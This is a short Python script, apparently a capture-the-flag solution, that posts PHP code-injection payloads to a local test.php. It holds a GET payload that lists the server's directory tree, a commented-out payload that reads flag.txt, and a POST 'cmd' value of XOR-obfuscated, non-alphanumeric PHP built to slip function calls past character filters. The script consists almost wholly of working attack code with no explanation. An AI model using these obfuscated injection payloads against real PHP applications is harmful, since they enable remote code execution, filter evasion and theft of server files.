import requests
# read dir
payload_get = "?_=$a=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$a->rewind();print_r(iterator_to_array($a));"
# read flag
# payload_get = "?_= echo gzread(gzopen('flag.txt','r'),1024);"

# actual payload print_r(create_function('reset($_GET);'));

# data = {"cmd": "(('.'^'^').(','^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^',')^(';')).'_'.(','^'^'))((((('='^'^')^'$')^'$').(','^'^').(';'^'^').((('='^'^')^'$')^(((('='^'^')^'.')^((('='^'^')^'$')^',')))).((('='^'^')^',')^(';')).(';'^'^').'_'.((('='^'^')^')')^(',')).((('='^'^')^',')^(((('='^'^')^'$')^'}'))).((('='^'^')^'$')^')').((('='^'^')^'$')^'$').((('='^'^')^',')^(';')).((('='^'^')^'$')^'.').((('='^'^')^'$')^'(').((('='^'^')^'$')^')'))('',((','^'^').(';'^'^').((('='^'^')^',')^((('='^'^')^'_'))).(';'^'^').((('='^'^')^',')^(';')))(${'_'.(('='^'^')^'$').(((('='^'^')^'$')^(((('='^'^')^'.')^((('='^'^')^'$')^','))))^('$')).(((('='^'^')^'$')^(((('='^'^')^')')^(';'^'^'))))^((('='^'^')^'_')))}))());".replace(" ","")}

data = {"cmd": "(('.'^'^').(','^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^',')^(';')).'_'.(','^'^'))((('.'^'^').((('='^'^')^'$')^(((('='^'^')^')')^(';'^'^')))).('.'^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^')')^(',')).((('='^'^')^'$')^'('))());"}
d = requests.post("http://localhost:8080/SOAL/slashroot6/test.php"+payload_get,data=data).text
open("test.txt",'w').write(d)
